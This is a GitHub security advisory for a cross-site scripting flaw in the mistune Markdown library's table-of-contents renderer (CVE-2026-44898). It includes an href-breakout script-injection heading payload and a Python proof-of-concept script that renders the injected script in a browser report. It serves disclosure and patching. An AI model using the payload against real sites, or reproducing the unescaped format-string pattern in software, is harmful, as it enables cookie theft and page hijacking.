# [M] Mistune TOC Anchor Injection XSS

## Summary
Severity: Medium
Advisory: GHSA-6269-cqxg-mhhv
CVE: CVE-2026-44898
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-6269-cqxg-mhhv
Type: github-advisory

## Affected
- PyPI: `mistune` — affected >=3.2.0 <3.2.1

## Details
## Summary
`render_toc_ul()` builds a `<ul>` table-of-contents tree from a list of `(level, id, text)` tuples. Both the `id` value (used as `href="#<id>"`) and the `text` value (used as the visible link label) are inserted into `<a>` tags via a plain Python format string — with no HTML escaping applied to either value.

When heading IDs are derived from user-supplied heading text (the standard use-case for readable slug anchors), an attacker can craft a heading whose text breaks out of the `href="#..."` attribute context, injecting arbitrary HTML tags including `<script>` blocks directly into the rendered TOC.

This vulnerability is closely related to H2 (unescaped `id=` in `heading()`): the same `heading_id` callback pattern that triggers H2 also populates the `toc_items` list that `render_toc_ul()` consumes, meaning both vulnerabilities fire simultaneously in a typical documentation setup.

## Details
**File:** `src/mistune/toc.py`

```python
def render_toc_ul(toc):
    ...
    for level, k, text in toc:
        # k   = heading id  (used verbatim as href fragment)
        # text = heading text (used verbatim as link label)
        item = '<a href="#{}">{}</a>'.format(k, text)
        # Neither k nor text is passed through escape() at any point
```

The `k` and `text` values come directly from the `toc_items` list accumulated during parsing. If `k` contains `"` or `>`, the `href` attribute is broken. If `text` contains `<`, raw tags are injected as the visible link content.

## PoC
**Step 1 — Establish the baseline (safe default IDs)**

The script creates a parser with `escape=True` and the default `add_toc_hook()` (no custom callback). The default hook assigns sequential numeric IDs that never contain user text:

```python
md_safe = create_markdown(escape=True)
add_toc_hook(md_safe)

bl_src = "# Introduction\n\n## Installation\n"
_, state = md_safe.parse(bl_src)
bl_out = render_toc_ul(state.env.get("toc_items", []))
```

Output — clean, safe TOC:
```html
<ul>
<li><a href="#toc_1">Introduction</a>
<ul>
<li><a href="#toc_2">Installation</a></li>
</ul>
</li>
</ul>
```

**Step 2 — Enable the vulnerable `heading_id` callback**

Register a callback that returns the raw heading text as the ID. This is the standard slug-based anchor pattern used by documentation generators:

```python
def raw_id(token, index):
    return token.get("text", "")

md_vuln = create_markdown(escape=True)
add_toc_hook(md_vuln, heading_id=raw_id)
```

**Step 3 — Craft the exploit payload**

Construct a heading whose text terminates the `href="#..."` attribute and injects a `<script>` block followed by a dangling `<a href="` to absorb the closing `">` that `render_toc_ul` appends:

```
## x"><script>alert(document.cookie)</script><a href="
```

When `raw_id` processes this heading, it returns the entire text as the ID: `x"><script>alert(document.cookie)</script><a href="`.

**Step 4 — Observe script injection in the TOC output**

```python
ex_src = '## x"><script>alert(document.cookie)</script><a href="\n'
_, state = md_vuln.parse(ex_src)
ex_out = render_toc_ul(state.env.get("toc_items", []))
```

`render_toc_ul()` formats the malicious ID directly into the `<a href>`:

```python
'<a href="#{}">{}</a>'.format(k, text)
# becomes:
'<a href="#x"><script>alert(document.cookie)</script><a href="">...<a/>'
```

Actual output:
```html
<ul>
<li><a href="#x"><script>alert(document.cookie)</script><a href="">x&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a href=&quot;</a></li>
</ul>
```

The `<script>` block is live in the document. Note that the anchor *label* (`text`) is escaped correctly by mistune's inline renderer before it reaches `toc_items`, but `k` (the heading ID) is not escaped anywhere.

### Script

I have built a script that you can use to verify this. It creates a HTML page showing the bypass so that you can see it render in the browser.

```python
#!/usr/bin/env python3
"""H4: render_toc_ul() puts raw heading ID into <a href> without escaping."""
import os, html as h
from mistune import create_markdown
from mistune.toc import add_toc_hook, render_toc_ul

def raw_id(token, index):
    return token.get("text", "")

# --- baseline ---
md_safe = create_markdown(escape=True)
add_toc_hook(md_safe)

bl_file = "baseline_h4.md"
bl_src  = "# Introduction\n\n## Installation\n"
with open(os.path.join(os.getcwd(), bl_file), "w") as f:
    f.write(bl_src)
_, state = md_safe.parse(bl_src)
bl_out = render_toc_ul(state.env.get("toc_items", []))

print(f"[{bl_file}]\n{bl_src}")
print("[toc output — safe]")
print(bl_out)

# --- exploit ---
md_vuln = create_markdown(escape=True)
add_toc_hook(md_vuln, heading_id=raw_id)

ex_file = "exploit_h4.md"
ex_src  = '## x"><script>alert(document.cookie)</script><a href="\n'
with open(os.path.join(os.getcwd(), ex_file), "w") as f:
    f.write(ex_src)
_, state = md_vuln.parse(ex_src)
ex_out = render_toc_ul(state.env.get("toc_items", []))

print(f"[{ex_file}]\n{ex_src}")
print("[toc output — script injected via href breakout]")
print(ex_out)

# --- HTML report ---
CSS = """
body{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}
h1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}
p.desc{color:#555;font-size:.9em;margin-top:6px}
.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}
.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}
.baseline .case-header{background:#d1fae5;color:#065f46}
.exploit  .case-header{background:#fee2e2;color:#7f1d1d}
.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}
.panel{padding:16px}
.panel+.panel{border-left:1px solid #eee}
.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}
pre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}
.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}
.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}
"""

def case(kind, label, filename, src, out):
    return f"""
<div class="case {kind}">
  <div class="case-header">{'BASELINE' if kind=='baseline' else 'EXPLOIT'} — {h.escape(label)}</div>
  <div class="panels">
    <div class="panel">
      <h3>Input — {h.escape(filename)}</h3>
      <pre>{h.escape(src)}</pre>
    </div>
    <div class="panel">
      <h3>TOC output — HTML source</h3>
      <pre>{h.escape(out)}</pre>
      <div class="rlabel">↓ rendered in browser</div>
      <div class="rendered">{out}</div>
    </div>
  </div>
</div>"""

page = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>H4 — TOC XSS</title><style>{CSS}</style></head><body>
<h1>H4 — TOC render_toc_ul() XSS</h1>
<p class="desc">render_toc_ul() in toc.py uses '&lt;a href="#{{}}"&gt;{{}}&lt;/a&gt;'.format(k, text) —
neither k (the heading ID) nor text is escaped before insertion.</p>
{case("baseline", "Normal headings → sequential IDs → clean TOC links", bl_file, bl_src, bl_out)}
{case("exploit",  "Malicious heading ID breaks out of href='#...' → script injected", ex_file, ex_src, ex_out)}
</body></html>"""

out_path = os.path.join(os.getcwd(), "report_h4.html")
with open(out_path, "w") as f:
    f.write(page)
print(f"\n[report] {out_path}")
```

Example usage:
```bash
python poc.py
```

Once you run the script, open `report_h4.html` in the browser and observe the behaviour.

## Impact
| Dimension        | Assessment |
|------------------|-----------|
| **Confidentiality** | JavaScript execution; attacker can exfiltrate session cookies and any data accessible from the page's origin |
| **Integrity**    | Arbitrary DOM manipulation, phishing form injection, forced redirects |
| **Availability** | Page crash or freeze available as secondary effect |

**Risk context:** TOC generation is a rendering step that often happens in a different template layer from the main body render, potentially reviewed separately and trusted implicitly. Vulnerabilities in TOC output are frequently overlooked in code review. Combined with H2, an attacker exploiting this via a single malicious heading simultaneously injects into both the heading element and the TOC anchor.

## References
- https://github.com/lepture/mistune/security/advisories/GHSA-6269-cqxg-mhhv
- https://nvd.nist.gov/vuln/detail/CVE-2026-44898
- https://github.com/lepture/mistune/commit/04880a0
- https://github.com/lepture/mistune
- https://github.com/lepture/mistune/releases/tag/v3.2.1
